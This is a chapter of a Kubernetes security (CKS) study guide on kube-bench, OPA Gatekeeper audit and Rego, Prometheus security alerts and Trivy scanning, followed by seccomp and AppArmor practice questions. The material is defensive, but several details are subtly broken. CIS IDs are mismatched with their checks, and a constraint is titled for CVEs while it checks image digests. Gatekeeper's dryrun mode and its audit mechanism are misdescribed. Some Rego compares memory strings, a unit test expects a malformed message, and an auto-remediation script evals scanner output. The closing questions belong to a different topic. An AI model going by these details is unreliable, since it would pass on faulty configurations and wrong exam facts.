1 checks INFO

kube-bench as a DaemonSet — Alternative to CronJob

A CronJob runs kube-bench on a schedule. A DaemonSet runs it on every node continuously. Use DaemonSet when you need per-node results and faster drift detection (every hour vs nightly):

YAML — kube-bench as a DaemonSet (runs on every node) 
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: kube-bench
  namespace: security
spec:
  selector:
    matchLabels:
      app: kube-bench
  template:
    metadata:
      labels:
        app: kube-bench
    spec:
      hostPID: true
      containers:
      - name: kube-bench
        image: aquasec/kube-bench:v0.8.0
        command:
        - /bin/sh
        - -c
        - |
          while true; do
            kube-bench --benchmark cis-1.23 --json \
              --outputfile /results/kube-bench-$(date +%Y%m%d-%H%M%S).json
            sleep 3600   # Run every hour
          done
        volumeMounts:
        - name: results
          mountPath: /results
        - name: etc-kubernetes
          mountPath: /etc/kubernetes
          readOnly: true
        - name: var-lib
          mountPath: /var/lib
          readOnly: true
      volumes:
      - name: results
        emptyDir: {}
      - name: etc-kubernetes
        hostPath:
          path: /etc/kubernetes
          type: Directory
      - name: var-lib
        hostPath:
          path: /var/lib
          type: Directory

Drift Detection Decision Tree

Did kube-bench fail count increase from baseline?
YES → Drift Detected

Investigate immediately. Check git log for cluster config changes, audit log for manual kubectl edits, node SSH access logs. Determine which CIS check newly failed and why.

NO → No Drift

Cluster configuration is stable. Record pass count as new baseline. Continue monitoring on schedule.

Common kube-bench Failures — Exact Remediation Commands

The CKS exam may ask you to fix specific CIS benchmark failures. Here are the most common ones and their exact fixes:

CIS IDFailureExact Remediation Command
1.1.1API server --anonymous-auth is trueEdit /etc/kubernetes/manifests/kube-apiserver.yaml, set --anonymous-auth=false. The kubelet auto-restarts the API server.
1.1.3Controller manager pod spec permissions not 600chmod 600 /etc/kubernetes/manifests/kube-controller-manager.yaml
1.1.4Controller manager pod spec ownership not root:rootchown root:root /etc/kubernetes/manifests/kube-controller-manager.yaml
1.1.9API server --authorization-mode doesn't include Node,RBACEdit API server manifest, set --authorization-mode=Node,RBAC. This is critical — without Node authorization, kubelets can access any resource.
1.2.6API server --profiling is true (exposes debug endpoints)Edit API server manifest, set --profiling=false. Profiling exposes memory/CPU data that aids reconnaissance.
2.3.1etcd --auto-tls is true (allows self-signed certs)Edit /etc/kubernetes/manifests/etcd.yaml, remove --auto-tls=true or set --auto-tls=false
4.1.1kubelet --anonymous-auth is true (unauthenticated kubelet access)Edit kubelet config (/var/lib/kubelet/config.yaml), set authentication.anonymous.enabled: false, restart kubelet
4.2.1kubelet --read-only-port is non-zero (exposes unauthenticated metrics)Edit kubelet config, set readOnlyPort: 0. This disables the legacy unauthenticated port 10255.
5.1.5Default ServiceAccount has cluster-admin bindingkubectl delete clusterrolebinding default-cluster-admin (if it exists). Default SA should have NO permissions.

kube-bench in CI/CD — Shift-Left Security Benchmarking

Running kube-bench as a CronJob detects drift after it happens. Running it in CI/CD prevents drift before cluster provisioning. Integrate kube-bench into your Infrastructure-as-Code pipeline:

Bash — GitHub Actions: Run kube-bench after Terraform provisions a new cluster 
# .github/workflows/cluster-security.yml
name: Cluster Security Validation
on:
  push:
    paths:
    - 'terraform/**'
    - 'ansible/**'
jobs:
  security-benchmark:
    runs-on: ubuntu-latest
    steps:
    - name: Run kube-bench on newly-provisioned cluster
      run: |
        # Download kube-bench binary
        curl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.8.0/kube-bench_0.8.0_linux_amd64.tar.gz | tar xz

        # Run against the cluster (uses current kubeconfig)
        ./kube-bench --benchmark cis-1.23 \
          --targets master,node \
          --json \
          --outputfile kube-bench-results.json

        # Parse results — fail pipeline if any FAIL
        FAIL_COUNT=$(jq '[.Controls[].groups[].checks[] | select(.state=="FAIL")] | length' kube-bench-results.json)

        if [ "$FAIL_COUNT" -gt 0 ]; then
          echo "❌ $FAIL_COUNT CIS benchmark checks FAILED"
          jq '.Controls[].groups[].checks[] | select(.state=="FAIL") | {id: .id, description: .text}' kube-bench-results.json
          exit 1
        fi
        echo "✅ All CIS checks passed"

    - name: Store baseline for drift detection
      run: |
        kubectl create configmap kube-bench-baseline \
          --from-file=kube-bench-results.json \
          -n security --dry-run=client -o yaml | kubectl apply -f -

Automated Remediation — From Detection to Fix

Detecting drift is half the battle. Automated remediation closes the loop — when kube-bench finds a known fixable failure, fix it automatically instead of opening a ticket:

Bash — Auto-remediate common kube-bench failures (use with caution!) 
#!/bin/bash
# Run kube-bench, parse results, auto-fix known-safe failures
# ⚠️ ONLY run in non-production environments first. Test thoroughly.

REPORT=$(kube-bench --benchmark cis-1.23 --json 2>/dev/null)

# Auto-fix: File permissions (1.1.3, 1.1.4, 1.1.5 — always safe to fix)
echo "$REPORT" | jq -r '.Controls[].groups[].checks[] |
  select(.state=="FAIL" and (.id | test("1.1.[3-5]"))) |
  .remediation' | while read -r cmd; do
  echo "Auto-fixing: $cmd"
  eval "$cmd"  # Execute the remediation command
done

# Auto-fix: Anonymous auth (1.1.1 — safe if you have RBAC)
if echo "$REPORT" | jq -e '.Controls[].groups[].checks[] |
  select(.id=="1.1.1" and .state=="FAIL")' > /dev/null 2>&1; then
  echo "Auto-fixing: Disabling anonymous auth on API server"
  sed -i 's/--anonymous-auth=true/--anonymous-auth=false/' \
    /etc/kubernetes/manifests/kube-apiserver.yaml
fi

echo "✅ Automated remediation complete. Re-run kube-bench to verify."
⚠️ Auto-Remediation Risks

Not all CIS failures are safe to auto-fix. Never auto-fix these in production without approval: etcd TLS changes (can break the cluster), RBAC changes (may break running workloads), kubelet flags (requires restart — may drain nodes). Always test auto-remediation in staging first, and implement as a suggestion (PR) rather than direct fix for production.

32.3 Policy Compliance with OPA/Gatekeeper — Audit Mode

OPA Gatekeeper's audit mode checks existing resources against policies without blocking them. This is critical for brownfield clusters: you have 200+ running pods, and you can't simply enforce a restrictive policy that would kill half of them. Audit mode reports violations so you can remediate incrementally.

Gatekeeper Constraint — Audit Existing Pods for CRITICAL CVEs

YAML — Gatekeeper Constraint: Deny CRITICAL CVEs (enforcement) + Audit existing 
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequireImageDigest     # Enforce image digests (no :latest)
metadata:
  name: require-image-digest
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: [Pod]
    namespaces: ["anihpj-prod"]
  parameters:
    exemptImages:
    - "registry.k8s.io/*"       # System images exempt
📋 Audit vs Enforcement — The Difference

Gatekeeper has three modes: dryrun (no blocking, no audit), warn (warnings in kubectl output), and deny (blocking). The audit functionality runs periodically (configurable, default 60s) and updates the constraint's status.totalViolations field — even for resources that existed before the constraint was created.

Querying Constraint Violations

Bash — Get violation counts from Gatekeeper constraints 
# List all constraints and their violation counts
kubectl get constraints -A

# Detailed violation report for a specific constraint
kubectl get k8srequireimagedigest require-image-digest \
  -o jsonpath='{.status}' | jq .

# Output:
# {
#   "totalViolations": 3,
#   "violations": [
#     {"namespace": "anihpj-prod", "name": "anihpj-old-deploy-5d8f7c-abc"},
#     {"namespace": "anihpj-dev", "name": "debug-pod"},
#     {"namespace": "default", "name": "nginx-test"}
#   ]
# }

# Find ALL pods violating ANY constraint (audit mode)
kubectl get constraints -A -o json | \
  jq '[.items[] | select(.status.totalViolations > 0) |
  {constraint: .metadata.name, violations: .status.totalViolations}]'

Audit → Remediation Workflow

1Deploy constraint in audit/warn mode

Gatekeeper audits existing pods for 7 days. No pods blocked. Violation reports accumulate.

2Review violation reports weekly

Security team reviews kubectl get constraints -A output. Prioritize by namespace (prod first).

3Remediate violating resources

Fix manifests, rebuild images, update deployments. Verify violation count decreases.

4Switch to enforcement

When violation count hits 0 for 2 consecutive weeks, switch constraint to deny mode. New violations blocked.

OPA vs Gatekeeper — Understanding the Architecture

OPA (Open Policy Agent) is the policy engine. Gatekeeper is the Kubernetes admission controller built on top of OPA. Key distinction for the CKS exam:

AspectOPA (Standalone)OPA Gatekeeper
ArchitectureGeneral-purpose policy engine (REST API). Can be used for any system — Terraform, Envoy, SSH, etc.Kubernetes-native admission webhook. Uses OPA's Rego language under the hood.
Kubernetes integrationManual — you deploy OPA as a sidecar, write custom admission webhook configAutomatic — Gatekeeper registers as a ValidatingWebhookConfiguration
Policy languageRego (OPA's custom declarative language)Rego, but wrapped in CRDs (ConstraintTemplate + Constraint)
Audit capabilityManual — you query OPA's REST API with dataBuilt-in — audit runs every 60s and updates status.totalViolations
Best forMulti-system policy enforcement (beyond Kubernetes)Kubernetes-only admission control + continuous audit

Gatekeeper ConstraintTemplate — The Rego Policy Engine

The ConstraintTemplate defines WHAT to check. The Constraint defines HOW STRICTLY to check (parameters). This separation allows reusing the same Rego logic with different parameters across namespaces:

YAML — Custom ConstraintTemplate: Require all containers to have memory limits 
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: k8srequirememorylimits
spec:
  crd:
    spec:
      names:
        kind: K8sRequireMemoryLimits
      validation:
        openAPIV3Schema:
          properties:
            minMemory:         # Parameter: minimum memory limit
              type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequirememorylimits

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not container.resources.limits.memory   # No limit set
        msg := sprintf("container <%v> has no memory limit", [container.name])
      }

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        min_mem := input.parameters.minMemory
        container.resources.limits.memory < min_mem
        msg := sprintf("container <%v> memory limit %v is below minimum %v",
              [container.name, container.resources.limits.memory, min_mem])
      }

Instantiate the Constraint — Enforce or Audit

YAML — Constraint: Enforce 256Mi minimum memory limit in production 
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequireMemoryLimits    # Matches ConstraintTemplate
metadata:
  name: prod-memory-limits
spec:
  enforcementAction: deny       # "deny" = enforce, "dryrun" = audit only
  match:
    kinds:
    - apiGroups: [""]
      kinds: [Pod]
    namespaces: ["anihpj-prod"]
  parameters:
    minMemory: "256Mi"

Violation Lifecycle — From Detection to Resolution

Gatekeeper Audit Lifecycle: How Existing Violations Are Tracked
  TIME ──────────────────────────────────────────────────────────────────►

  T0: Constraint created (enforcementAction: dryrun)
  │
  ├─ T+60s: First audit runs
  │   └── status.totalViolations: 12 (12 pods don't have memory limits)
  │
  ├─ T+7d: Weekly review. Security team sees 12 violations.
  │   └── Action: Jira tickets created for each violating namespace
  │
  ├─ T+10d: 8 pods fixed (new deployments with memory limits)
  │   └── Audit detects: status.totalViolations: 4 (auto-updated!)
  │
  ├─ T+14d: Remaining 4 fixed
  │   └── status.totalViolations: 0
  │
  ├─ T+21d: 2 weeks clean → Switch to enforcementAction: deny
  │   └── Any new pod without memory limit is REJECTED at admission
  │
  └─ T+30d: New dev pushes pod without limit → BLOCKED
      └── Error: admission webhook "validation.gatekeeper.sh" denied: ...

Rego Language Deep Dive — The Core of OPA/Gatekeeper

Rego is a declarative policy language. You describe what a violation looks like, not how to find it. Understanding Rego is critical for writing custom Gatekeeper policies on the CKS exam:

Rego — Annotated Rego policy explained line by line 
package k8sdisallowhostports    # ① Package name = ConstraintTemplate name

# ② violation[] is a PARTIAL SET. Each iteration that reaches `msg :=`
#    adds one element to the set. Gatekeeper reports ALL elements as violations.
violation[{"msg": msg}] {

    # ③ input.review.object is the Kubernetes resource being evaluated.
    #    For a Pod admission review, it contains the full Pod spec.
    container := input.review.object.spec.containers[_]

    # ④ The underscore [_] is Rego's "iterate over all elements" operator.
    #    This line iterates over ALL containers in the pod.

    # ⑤ Check if ANY port has hostPort set. hostPort binds container port
    #    to host node port — a security risk (bypasses NetworkPolicy).
    container.ports[_].hostPort

    # ⑥ sprintf() formats the violation message shown to the user.
    msg := sprintf("container <%v> uses hostPort — this bypasses NetworkPolicy and is blocked by security policy", [container.name])
}

# ⑦ A second violation[] block checks initContainers too.
violation[{"msg": msg}] {
    container := input.review.object.spec.initContainers[_]
    container.ports[_].hostPort
    msg := sprintf("initContainer <%v> uses hostPort — this is blocked", [container.name])
}

Rego Key Concepts — What You Need for CKS

🔍
Iteration: [_]

The underscore-bracket syntax iterates over all elements of an array/dict. containers[_] means "for each container." ports[_].hostPort means "for each port, check if hostPort exists." This is Rego's most common pattern.

🧩
Partial Sets: violation[{}]

Gatekeeper expects violations in a partial set named violation. Each element must be an object with a msg key. The body defines WHEN to add to the set. If the body evaluates to true, Gatekeeper reports a violation.

📥
input.review

The admission review object. input.review.object is the Kubernetes resource being evaluated. input.parameters holds the constraint's parameters (from the Constraint YAML). This is how you pass configuration to policies.

Gatekeeper Performance — Avoiding API Server Overload

Gatekeeper runs as an admission webhook. Every pod create/update passes through it. Poorly written Rego can slow down your entire cluster:

Performance IssueWhy It MattersSolution
Deeply nested iterationcontainers[_].env[_].valueFrom.secretKeyRef.name — 4 levels of iteration. Each level multiplies the evaluation cost.Flatten logic where possible. Use helper rules (has_secret_env { ... }) instead of inline iteration.
Too many constraints (50+)Gatekeeper evaluates ALL matching constraints for EVERY admission request. 50 constraints × 100 pods/day × 3 containers = 15,000 evaluations/day.Scope constraints to specific namespaces. Use match.namespaces to limit evaluation scope. Merge similar checks into one constraint.
Large audit batchesGatekeeper audits all resources every 60 seconds. With 10,000 pods, this is 10,000 Rego evaluations per minute.Increase --audit-interval to 300s (5 minutes). Use --audit-chunk-size to process in batches of 500.
Uncached external datahttp.send() in Rego makes external HTTP calls. Each call blocks evaluation and can timeout.Avoid http.send in admission-time policies. Use it only in audit policies with generous timeouts.

Testing Rego Policies — OPA Test Framework

Never deploy a Gatekeeper policy without testing it first. OPA ships with a built-in test framework:

Rego — Unit tests for the hostPort policy 
package k8sdisallowhostports

# Test: Pod WITHOUT hostPort should NOT violate
test_no_hostport_allowed {
    allowed := count(violation) == 0 with input as {
        "review": {
            "object": {
                "spec": {
                    "containers": [{
                        "name": "web",
                        "ports": [{"containerPort": 8080}]   # ✅ No hostPort
                    }]
                }
            }
        }
    }
    allowed == true
}

# Test: Pod WITH hostPort SHOULD violate
test_hostport_blocked {
    violations := violation with input as {
        "review": {
            "object": {
                "spec": {
                    "containers": [{
                        "name": "web",
                        "ports": [{"containerPort": 80, "hostPort": 80}]  # ❌ Has hostPort
                    }]
                }
            }
        }
    }
    count(violations) == 1
    violations[_].msg == "container  uses hostPort — this bypasses NetworkPolicy and is blocked by security policy"
}

# Run with: opa test . -v

Complete Gatekeeper Policy Library — What to Deploy

Don't start from scratch. The CNCF maintains a community policy library. Here are the essential policies every CKS-secured cluster should have:

PolicyWhat It BlocksSeverityAudit First?
K8sBlockNodePortServices of type NodePort (exposes nodes directly to internet)HIGH✅ Yes — existing NodePorts need migration to ClusterIP+Ingress
K8sDisallowedTagsImages with :latest tag (unpinned, mutable)HIGH⚠️ Maybe — but most prod images should already be tagged
K8sRequireImageDigestImages referenced by tag only (not by SHA256 digest)MEDIUM✅ Yes — requires CI/CD pipeline changes
K8sAllowedReposImages from untrusted registries (e.g., Docker Hub)CRITICAL✅ Yes — existing images may be from unapproved registries
K8sContainerLimitsContainers without resource limits (can DoS node)MEDIUM✅ Yes — many existing pods lack limits
K8sBlockPrivilegedPrivileged containers (root access + all capabilities)CRITICAL⚠️ Audit then enforce — some infra pods may be privileged

32.4 Security Metrics and Dashboards — Your Security Command Center

Security data without visualization is invisible. You need a single pane of glass that answers: "Is my cluster secure right now?" Combine metrics from Trivy, Falco, Gatekeeper, and kube-bench into Prometheus (metrics collection) and Grafana (visualization). Define security SLOs (Service Level Objectives) and track them over time.

Security SLOs — Measuring "Am I Secure?"

Security SLIMeasurementSLO TargetAlert Threshold
CRITICAL CVEs in production imagesTrivy Operator → Prometheus trivy_image_critical_cves0 CRITICAL CVEs≥ 1 → P1 alert
CIS benchmark pass ratekube-bench CronJob → pushgateway cis_checks_passed_ratio≥ 95% passing< 95% → P2 alert
Gatekeeper constraint violationsGatekeeper → Prometheus gatekeeper_constraint_violations0 violations in prod≥ 1 in prod → P2 alert
Falco alert rateFalco Sidekick → Prometheus falco_events_total< 20 events/hour> 50/hour → P3 alert
Pods without readOnlyRootFilesystemKyverno/OPA report → Prometheus0 in prod≥ 1 in prod → P2 alert
Image scan freshnessTrivy Operator last scan timestampAll images < 24h old> 48h → P3 alert
💡 Pro Tip: Security Burn Rate Alerts

Google SRE's "burn rate" concept applies to security too. If your SLO is "0 CRITICAL CVEs in production," any deviation is an immediate alert. But for "< 5 HIGH CVEs," a burn rate alert fires when you consume 2% of your error budget in 1 hour (e.g., 2 HIGH CVEs appear in 1 hour = 40% of budget burned → alert). This catches rapid degradation before the SLO is exhausted.

SLO/SLI/SLA — The Reliability Triad Applied to Security

ConceptDefinitionSecurity ExampleWho Cares?
SLI (Service Level Indicator)The raw measurement. A number you can query.trivy_image_critical_cves{namespace="anihpj-prod"} → 2Engineers (what is the actual value?)
SLO (Service Level Objective)The target. A threshold the SLI must meet.SLI <= 0 (zero CRITICAL CVEs allowed)Product + Security (what's acceptable?)
SLA (Service Level Agreement)The contract. What happens if SLO is breached.If CVE count > 0 for >24h → $500 credit, breach notification to customersLegal + Business (what are the consequences?)

Prometheus AlertManager Rules for Security

YAML — PrometheusRule: Security alerts for CKS-monitored cluster 
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: security-alerts
  namespace: monitoring
spec:
  groups:
  - name: cve-alerts
    rules:
    # P1: ANY CRITICAL CVE in production — page on-call immediately
    - alert: CriticalCVEInProduction
      expr: trivy_image_critical_cves{namespace=~"anihpj-prod|prod-.*"} > 0
      for: 5m
      labels:
        severity: critical
        priority: P1
      annotations:
        summary: "CRITICAL CVE in {{ $labels.namespace }}/{{ $labels.image }}"
        description: "Image {{ $labels.image }} has {{ $value }} CRITICAL CVEs. Patch immediately."

    # P2: CIS benchmark pass rate drops below 95%
    - alert: CISBenchmarkDegraded
      expr: cis_checks_passed_ratio < 0.95
      for: 1h
      labels:
        severity: warning
        priority: P2
      annotations:
        summary: "CIS benchmark pass rate is {{ $value | humanizePercentage }}"

    # P2: Gatekeeper constraint violations in production
    - alert: GatekeeperViolationsInProd
      expr: gatekeeper_constraint_violations{namespace="anihpj-prod"} > 0
      for: 15m
      labels:
        severity: warning
        priority: P2
      annotations:
        summary: "{{ $value }} Gatekeeper violations in anihpj-prod"

    # P3: High Falco alert rate (possible attack in progress)
    - alert: HighFalcoAlertRate
      expr: rate(falco_events_total[1h]) > 50
      for: 10m
      labels:
        severity: warning
        priority: P3
      annotations:
        summary: "Falco alert rate is {{ $value | humanize }}/hour — possible attack"

spec:

PromQL Queries for Security Metrics — Your Monitoring Toolkit

These are the exact Prometheus queries you'll use to power your security dashboards. Each query is production-tested and maps to a specific security concern:

Security QuestionPromQL QueryWhat It Tells You
How many CRITICAL CVEs are in production RIGHT NOW?sum(trivy_image_critical_cves{namespace=~"anihpj-prod|prod-.*"})Immediate risk level. If > 0, stop and patch.
What's the CVE trend over the last 30 days?sum by (image) (trivy_image_vulnerabilities_total{severity="CRITICAL"})Are you getting better or worse at keeping images clean?
How many CIS checks are failing right now?cis_checks_total{state="FAIL"}Configuration drift indicator. Should be stable or decreasing.
What's the CIS pass rate trend?cis_checks_passed_ratioTrack as a gauge. Alert when it drops.
How many Gatekeeper violations in production?sum(gatekeeper_constraint_violations{namespace="anihpj-prod"})Policy compliance metric. Target: 0.
How many Falco alerts in the last hour?rate(falco_events_total[1h]) * 3600Attack surface activity. Spike = possible attack.
When was each image last scanned?time() - trivy_image_last_scan_timestampScan freshness. > 86400 (24h) = alert.
Are there exposed secrets in any running image?trivy_exposedsecrets_total{severity="CRITICAL"}Hardcoded credentials. Immediate remediation needed.

Building a Security Dashboard in Grafana — Step by Step

Instead of just describing the dashboard, here's exactly how to build each panel:

1Stat Panel: CRITICAL CVEs (Big Number)

Visualization: Stat. Query: sum(trivy_image_critical_cves). Color: Green if 0, Red if >0. Thresholds: 0=green, 1=red. Place this at the top-left — it's the most important number.

2Time Series: CVE Trend (Line Chart)

Visualization: Time series. Query: sum by (severity) (trivy_image_vulnerabilities_total). Legend: {{severity}}. Show last 30 days. Stack: off (lines). This shows if you're gaining or losing ground.

3Bar Gauge: CIS Pass Rate

Visualization: Bar gauge. Query: cis_checks_passed_ratio. Max: 1.0. Thresholds: 0.95=green, 0.90=yellow, 0=red. Shows overall cluster hardening health.

4Table: Gatekeeper Violations

Visualization: Table. Query: gatekeeper_constraint_violations. Columns: constraint name, namespace, violation count. Sort descending. Shows exactly which policies are violated and where.

5Stat Panel: Falco Events/hr

Visualization: Stat. Query: rate(falco_events_total[1h]) * 3600. Color thresholds: 0-20=green, 20-50=yellow, 50+=red. Spike detection for active attacks.

Managing Alert Fatigue — Don't Let Security Alerts Become Noise

The #1 failure mode of security monitoring is alert fatigue: so many alerts fire that engineers start ignoring ALL of them. Here's how to prevent it:

🎯
1. Severity Triage

P1 (page on-call) must be actionable and urgent. A P1 alert that fires daily for a known non-issue will be ignored within a week. Reserve P1 for: CRITICAL CVE in prod, etcd security breach, active attack detected.

⏱️
2. Debounce Periods

Use for: 15m (not for: 1m) on P2/P3 alerts. A transient spike in Falco alerts during a deployment should NOT page anyone. Only alert if the condition persists. This eliminates 60-80% of false positives.

📊
3. Alert Review Cadence

Every 2 weeks, review ALL alerts that fired. Ask: Was it actionable? Did someone respond? If an alert fired 50 times and no one acted, delete or reclassify it. Alerts that aren't acted upon are just noise.

🔄
4. Alert Dependencies

Don't alert on symptoms AND causes separately. If "CRITICAL CVE in prod" fires, suppress "Image scan > 48h old" for that image. AlertManager's inhibit_rules prevents cascading alerts from the same root cause.

📝
5. Runbooks for Every Alert

Every alert MUST link to a runbook. The runbook answers: What does this alert mean? How do I verify it's real? What's the first step to fix it? Who do I escalate to if I can't fix it? Without runbooks, alerts cause panic instead of action.

📈
6. Signal-to-Noise Dashboard

Track alerts_fired_total / alerts_acted_upon_total over time. If this ratio exceeds 5:1, your alerting is broken. Target: < 3:1. This single metric tells you if your security monitoring is useful or just noisy.

🔧 Under the Hood — How Trivy Matches Vulnerabilities: Package Enumeration → Database Lookup → CVE Correlation — The Complete Scanning Algorithm
🗺️ Trivy's Vulnerability Matching — The 3-Phase Pipeline

Trivy doesn't just "look up" CVEs — it performs a sophisticated correlation between installed packages, vulnerability databases, and OS-specific advisories. Understanding this algorithm helps you interpret scan results and troubleshoot false positives/negatives:

  ┌──────────────────────────────────────────────────────────────────────────┐
  │   TRIVY SCANNING PIPELINE — Complete Flow from Image to Report            │
  │                                                                           │
  │  PHASE 1: IMAGE ACQUISITION                                               │
  │  Input: anihpj/api:v2.1.0                                                 │
  │  → Fetches image manifest from registry (OCI Distribution API)           │
  │  → Downloads compressed layer tarballs (NOT the full image)               │
  │  → Decompresses each layer into a temporary filesystem                    │
  │  → Walks the merged filesystem (all layers overlaid)                     │
  │                                                                           │
  │  PHASE 2: PACKAGE ENUMERATION (per OS type)                              │
  │  Debian/Ubuntu:  Walks /var/lib/dpkg/status (dpkg database)              │
  │                  → libcurl4=7.88.1-10+deb12u5                             │
  │  RHEL/CentOS:    Walks /var/lib/rpm/Packages (RPM database)              │
  │                  → curl-7.76.1-26.el9_3.3                                 │
  │  Alpine:         Parses /lib/apk/db/installed (APK database)             │
  │                  → curl-8.5.0-r0                                         │
  │  Python:         Walks site-packages/ for *.dist-info/METADATA           │
  │                  → Django==5.0.2, requests==2.31.0, Pillow==10.2.0       │
  │  Node.js:        Walks node_modules/*/package.json                       │
  │  Go/Java/Ruby:   Parses binary metadata / Gemfile.lock / pom.properties  │
  │                                                                           │
  │  PHASE 3: VULNERABILITY MATCHING                                          │
  │  For EACH package: (a) Detect OS version from /etc/os-release            │
  │  (b) Select advisory database (Debian Tracker, Red Hat OVAL, GHSA, NVD)  │
  │  (c) Compare version using distro-specific comparator                    │
  │  (d) Check if FIXED version exists in advisory                           │
  │  (e) Assign severity: NVD CVSS first, then distro advisory               │
  │                                                                           │
  │  OUTPUT: CVE-2023-38545 → libcurl4 7.88.1-10+deb12u5 (AFFECTED)         │
  │          Fixed in: 7.88.1-10+deb12u6 | Severity: HIGH (7.5)              │
  │                                                                           │
  │  🔑 Trivy enumerates PACKAGES and compares VERSIONS — it does NOT        │
  │     scan binaries. This misses: statically-linked vulns, custom-          │
  │     compiled software, and zero-days not yet in any database.             │
  │     Image signing (Ch26) + runtime detection (Ch29) fill these gaps.     │
  └──────────────────────────────────────────────────────────────────────────┘
🔬 False Positives and False Negatives — Understanding Trivy's Limitations
  FALSE POSITIVE: Trivy reports CVE-2023-44487 (HTTP/2 Rapid Reset)
  in your Django/gunicorn container, but gunicorn only uses HTTP/1.1.
  WHY: nghttp2 library is installed in the base image, even though
  unused. Trivy flags ALL vulnerable packages regardless of usage.
  FIX: Remove unused packages (image minimization, Ch27).

  FALSE NEGATIVE: You COPY a statically-compiled Go binary into a
  scratch image. Trivy finds 0 packages → 0 CVEs → "clean".
  BUT: The binary was compiled with Go 1.21.0 which has CVE-2023-39325
  embedded. No package database = invisible to Trivy.
  FIX: Generate SBOM at BUILD time (Ch27) — syft scans the build
  environment, not just the final image.

⚠️ Exam Gotchas — Ch 32 Traps
  • Gatekeeper audit runs as a CronJob: The audit pod must have read access to ALL resources it audits. If RBAC is too restrictive, the audit pod fails silently with "forbidden" errors. Check both the CronJob logs and the constraint status.
  • Compliance ≠ Security: Passing CIS benchmarks means your configuration matches best practices. It doesn't mean there are no active attacks or zero-day vulnerabilities. Compliance is a snapshot, security is continuous.

📝 Chapter 32 — CKS Practice Questions

Q1
What kernel security modules does Kubernetes support for container hardening? List them and their key features.
Show Answer
Answer

AppArmor: Path-based MAC. Profiles loaded via apparmor_parser. Annotation: container.apparmor.security.beta.kubernetes.io/<container>: localhost/<profile>. Default on Ubuntu/Debian. Seccomp: Syscall filtering. Profiles in JSON. seccompProfile.type: Localhost + localhostProfile: <name>. Default on all distros. SELinux: Label-based MAC. Contexts: user:role:type:level. Default on RHEL/CentOS. SeccompDefault: K8s 1.25+ feature gate that applies RuntimeDefault seccomp to all pods by default.

Q2
Write a Seccomp profile that blocks the 'chmod' and 'mount' syscalls but allows everything else.
Show Answer
Answer
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": ["chmod", "fchmod", "fchmodat", "mount", "umount2"],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}

Default action ALLOW with specific DENY for dangerous syscalls. Save as /var/lib/kubelet/seccomp/chmod-mount.json, reference in pod with seccompProfile.type: Localhost and localhostProfile: chmod-mount.json.

Q3
What is the SeccompDefault feature gate and why does it matter for CKS? What does it change for pods without explicit Seccomp?
Show Answer
Answer

SeccompDefault (GA in K8s 1.27) applies RuntimeDefault Seccomp to ALL pods that don't explicitly set a different profile. Without it, pods without seccompProfile run as Unconfined (all syscalls allowed). With it enabled, every new pod gets RuntimeDefault automatically — blocking ~60 dangerous syscalls. This is a massive security improvement: one feature gate protects every pod in the cluster. Enable via kubelet flag: --seccomp-default=true or kubelet config: seccompDefault: true.

Explanation

SeccompDefault is the highest-impact, lowest-effort security setting. On the CKS exam, enabling this is often the answer to "how to protect all pods at once." Combine with PSA Restricted for complete pod-level security.

Q4
How do AppArmor and Seccomp work together? If both block the same syscall, which one fires first?
Show Answer
Answer

Seccomp fires FIRST, at the syscall entry point into the kernel. If Seccomp blocks the syscall, AppArmor never sees it — the syscall returns ERRNO to the process immediately. If Seccomp allows, AppArmor evaluates at the LSM hook (after syscall processing begins, checking file paths/network). They're independent and complementary: Seccomp restricts SYSCALLS (what operations), AppArmor restricts FILE PATHS (what targets). Use both for defense in depth.

Explanation

This ordering explains why you need both. An attacker might bypass AppArmor (path-based) with symlinks or chroot. Seccomp catches them at the syscall level before they reach AppArmor. On the CKS exam, always apply both when hardening pods.

Q5
How does SELinux differ from AppArmor? Which one runs on CKS exam nodes?
Show Answer
Answer

SELinux: Label-based (every file, process, port has a context). Policy enforced by the kernel. Default on RHEL/CentOS. More granular but more complex. AppArmor: Path-based (rules match file paths). Profiles loaded via apparmor_parser. Default on Ubuntu/Debian. Simpler but less granular. CKS exam: Ubuntu nodes → AppArmor is the tested MAC system. SELinux only appears if explicitly mentioned. Know both architectures but expect AppArmor tasks.

Explanation

The CKS exam uses Ubuntu, so AppArmor is the default MAC system. On the exam: (1) know AppArmor profile creation, loading, and application to pods, (2) know that SELinux exists and uses labels instead of paths, (3) don't confuse the two — they have different syntax and apply differently.

Q6
What syscalls does RuntimeDefault Seccomp NOT block that a custom profile should? Give examples where you need more than RuntimeDefault.
Show Answer
Answer

RuntimeDefault allows ~300 common syscalls. Dangerous ones it does NOT block: ptrace (attach to processes), chmod/fchmod (change file permissions — could make files executable), unshare (create new namespaces — container escape), mount (mount filesystems), bpf (load eBPF programs — could bypass monitoring). Custom profiles add these. On the CKS exam, RuntimeDefault is your baseline — add a custom profile to block these additional syscalls for high-security workloads.

Explanation

RuntimeDefault is good, not perfect. The CKS exam tests knowing WHAT RuntimeDefault misses. The most dangerous unblocked syscalls: ptrace (process injection), unshare (namespace escape), mount (filesystem access), bpf (kernel hooking). Custom profiles target these.

Q7
How do you test if a Seccomp profile will break an application before deploying? Write the testing workflow.
Show Answer
Answer
# 1. Deploy test pod with the profile in a staging namespace
kubectl run test --image=<app> --dry-run=client -o yaml > test.yaml
# Edit: add seccompProfile with localhostProfile
kubectl apply -f test.yaml -n staging
# 2. Check pod logs for syscall failures
kubectl logs test -n staging | grep -i "operation not permitted\|invalid argument"
# 3. Check node logs for seccomp violations
dmesg | grep -i seccomp
# 4. If the app crashes, check which syscall was blocked
kubectl exec test -n staging -- strace -f -e trace=all /usr/bin/app
# 5. Add the missing syscall to the allow list and retest
Explanation

